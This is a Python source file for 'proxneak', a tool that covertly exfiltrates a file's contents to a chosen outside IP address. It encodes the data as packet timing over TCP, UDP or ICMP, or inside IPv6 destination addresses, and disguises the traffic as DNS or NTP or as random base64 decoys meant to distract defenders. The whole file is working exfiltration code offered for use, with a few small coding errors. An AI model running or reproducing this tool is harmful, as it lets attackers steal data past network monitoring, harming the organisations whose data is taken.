# File: proxneak.py
# Copyright (c) 2012 by Jarrod Frates
#
# GNU General Public Licence (GPL)
#
# This program is free software; you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation; either version 2 of the License, or (at your option) any later
# version.
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
# details.
# You should have received a copy of the GNU General Public License along with
# this program; if not, write to the Free Software Foundation, Inc., 59 Temple
# Place, Suite 330, Boston, MA  02111-1307  USA
#

import argparse
import base64
import binascii
import bz2
import ipaddress
from random import randrange, choice
import socket
import string
import sys
import time

parser = argparse.ArgumentParser(description='Sneak data out through any ' +
    'connection that allows traffic to pass through, even if it\'s a '
    'regenerative proxy. Be aware that random latency can cause problems ' +
    'reconstructing the data at the receiving end; latency effects increase ' +
    'as packet rate is increased.')
parser.add_argument('-s', nargs=1, metavar='<src>',
    help='Source IP address (not currently implemented')
parser.add_argument('-d', nargs=1, metavar='<dst>',
    help='Destination IP address (required)')
parser.add_argument('--v6', action='store_true', help='Embed information ' +
    'in IPv6 address structure')
parser.add_argument('-b', nargs=1, metavar='bytes',
    help='Bytes at end of IPv6 address available for embedding message')
parser.add_argument('-p', nargs=1, metavar='port',
    help='Destination port (default is 53)')
parser.add_argument('--proto', nargs=1, metavar='',
    help='Protocol to use (t=TCP, u=UDP (default), i=ICMP); ICMP requires ' +
    'root access')
parser.add_argument('-f', nargs=1, metavar='filename', help='Input file name')
parser.add_argument('-r', nargs=1, metavar='integer',
    help='Number of packets to send per second ' +
    '(default 1; recommended is 5 or less)')
parser.add_argument('--real', action='store_true', help='Make the packets ' +
    'look like real traffic (defaults to random if unknown port)')
parser.add_argument('-v', action='store_true', help='Verbose mode (be aware ' +
    'that this may leave behind artifacts)')
parser.add_argument('-V', action='version', version='0.4',
    help='Display version number')
parser.add_argument('-z', action='store_true',
    help='Compress content using bzip2 before sending')

args = parser.parse_args()

# Set some default parameters if they're not already set by argument.
# Defaults are port 53, 1 packet/sec, use UDP
if args.d:
    try:
        dest = ipaddress.ip_address(args.d[0])
    except:
        print("Destination address is invalid.")
        sys.exit()
    dest_addr = dest.exploded
    dest_ver = dest.version
else:
    print("Destination address (-d) is required.")
    sys.exit()

if args.v6:
    if not args.b:
        print("Number of bytes to use (-b) is required.")
        sys.exit()
    v6_bytes = int(args.b[0])
    if (v6_bytes > 8) or (v6_bytes < 1):
        print("Number of bytes to use must be between 1 and 8")
        sys.exit()

if not args.p:
    dstport = 53
else:
    dstport = int(args.p[0])

if args.f:
    f_in = args.f[0]
if not args.r:
    pps = 1
else:
    pps = int(args.r[0])

if not args.proto:
    proto = 'TCP'
else:
    if args.proto[0] == 't':
        proto = 'TCP'
    elif args.proto[0] == 'u':
        proto = 'UDP'
    elif args.proto[0] == 'i':
        proto = 'ICMP'
    else:
        proto = 'UDP'

debug_count = 0

data = ''


# Set packet data.  By default, This is a random string that is then encoded
# with base64.  The intention is to drive the defenders nuts trying to decode
# and then decrypt what looks like encrypted data, thus further distracting them
# from the true goal of the program.
# TODO: Make this look more realistic for some protocols
# TODO: ICMP to look like Windows, Linux, or Plan9
# TODO: TCP to look like Windows or Linux
def p_data():
    global data
    if args.real == 0:
        data = payload_rand()
    else:
        data = payload_real()
    return data


def payload_rand():
    payload = ''
    data_len = randrange(16, 120)
    payload.join(choice(string.ascii_uppercase + string.digits)
        for x in range(data_len))
    payload = base64.b64encode(payload.encode('ascii'))
    return payload


def payload_real():
    if proto == 'UDP':
        # For DNS, send a request for www.google.com
        # (There's a better way to handle this, I'm sure), probably something
        # built in to Python.  I'll look it up later.
        if dstport == 53:
            seq_num = chr(randrange(1, 255)) + chr(randrange(1, 255))
            payload = '\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77'
            payload = payload + '\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d'
            payload = payload + '\x00\x00\x01\x00\x01'
            payload = seq_num + payload
            return payload
        # For NTP, pick the start time and send packets based on that.
        # It's not ideal but should work for most monitoring systems, especially
        # for small transmissions.
        if dstport == 123:
            stamp = hex(int((time.time() + 2208988800)))
            stamp_hex = binascii.a2b_hex(stamp[2:]) + '\xec\x42\xee\x92'
            payload = '\xd9\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90'
            payload = payload + ('\x00' * 28) + stamp_hex
            return payload
    return payload_rand()


# binstring takes a single character and converts it to an 8-character string
#   of zeroes and ones
def binstring(c):
    if (len(c) > 1) or (type(c) is not str):
        return None
    str1 = str(bin(ord(c)))[2:]
    if len(str1) < 8:
        str1 = '0' * (8 - len(str1)) + str1
    return str1


# sendchar takes a single character, uses binstring to convert it to "binary",
# and then parses the "binary" string to determine whether to send a packet
# after each timing gap
def sendchar(c, delay):
    global debug_count
    if args.v:
        print('===============> ' + c + ' <===============')
    str1 = binstring(c)
    if str1 is None:
        return
    for l in str1:
        if l == '0':
            if args.v:
                debug_count += 1
            # print(str(debug_count) + " No packet to send")
            time.sleep(delay)
        else:
            if args.v:
                debug_count += 1
            buildandsend(delay)


# sendmessage parses the text to send, running each character through sendchar
# to send out the packet sequence representing the binary of the text.
def sendmessage(text, rate):
    if type(text) is not str:
        return "proxneak requires a string to send"
    if rate <= 0:
        return "proxneak requires a positive rate"
    for l in text:
        sendchar(l, 1. / rate)


# Check the protocol and send packets of the appropriate type
# PONDER: Better to have timer here or in sendchar?
def buildandsend(delay):
    global debug_count
    if args.v:
        print(str(debug_count) + " Sending packet")
    dest_local = str(dest)
    if (proto == 'TCP'):
        if dest_ver == 4:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        else:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
        try:
            s.connect((dest_local, dstport))
            s.close
        except:
            pass
        time.sleep(delay)
    if (proto == 'UDP'):
        if dest_ver == 4:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        else:
            s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0)
        s.connect((dest_local, dstport))
        s.send(p_data())
        s.close
        time.sleep(delay)
    if (proto == 'ICMP'):
        if dest_ver == 4:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
        else:
            s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 1)
        s.connect((dest_local, dstport))
        s.send(p_data())
        s.close
        time.sleep(delay)
    return


# Take an abbreviated IPv6 address and turn it into a full address
def expand_ipv6():
    addr_1 = dest_addr.split(':')
    addr_2 = []
    for i in addr_1:
        if len(i) == 0:
            j = 8 - len(addr_1) + 1
            while j > 0:
                addr_2.append("0000")
                j = j - 1
        elif len(i) < 4:
            i = ('0' * (4 - len(i))) + i
            addr_2.append(i)
        else:
            addr_2.append(i)
    addr_str = ''.join(addr_2)
    return addr_str


# Embeds the message in the last m_size bytes
def sendmessage_v6(text, rate):
    global debug_count
    m_size = v6_bytes
    a = expand_ipv6()
    print(a)
    prefix = a[0:((16 - m_size) * 2)]
    print(prefix)
    suffix = ''
    while len(text) > 0:
        text2 = text[0:v6_bytes]
        text = text[v6_bytes:]
        for c in text2:
            suffix = suffix + str(hex(c))[2:]
            if len(suffix) == v6_bytes * 2:
                addr = prefix + suffix
                buildandsend_v6(addr, 1 / rate)
                suffix = ''
    print("Done")


# Send IPv6 packets based on message need
def buildandsend_v6(address, delay):
    print(address)
    global debug_count
    if args.v:
        print(str(debug_count) + " Sending packet")
    dest_enc = str(ipaddress.ip_address(int(address, 16)))
    print(dest_enc, dstport)
    if (proto == 'TCP'):
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
        try:
            s.connect((dest_enc, dstport))
            s.close
        except:
            pass
        time.sleep(delay)
    if (proto == 'UDP'):
        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0)
        s.connect((dest_enc, dstport))
        s.send(p_data())
        s.close
        time.sleep(delay)
    if (proto == 'ICMP'):
        s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 1)
        s.connect((dest_enc, dstport))
        s.send(p_data())
        s.close
        time.sleep(delay)
    return None


# Retrieve the data to send and put it in base64 format.  This removes the
# possibility of NULL and 0xFF characters (terminating string) being sent.
def main():
    content = open(f_in, mode='rb')
    if args.z:
        message = base64.b64encode(bz2.compress(content.read()))
    else:
        message = base64.b64encode(content.read())

    # Debug code to compare input and output
    if args.v:
        tMessageFile = open('tempmessage-b64', 'wb')
        tMessageFile.write(message)
        tMessageFile.close

    if not args.v6:
        # Send based on
        # Synchronize the connection by sending eight packets
        print("Synchronizing...")
        sendmessage(chr(255), pps)

        # Send the message as one bit per transmission
        print("Sending data...")
        sendmessage(message, pps)

        # Close out the connection with ending sequence of 0x00FF
        print("Finishing up.")
        sendmessage(chr(0) + chr(255) + chr(255), pps)
    else:
        print(message)
        sendmessage_v6(message, pps)
        # print("IPv6 not supported")
        # sys.exit()

if __name__ == '__main__':
    main()
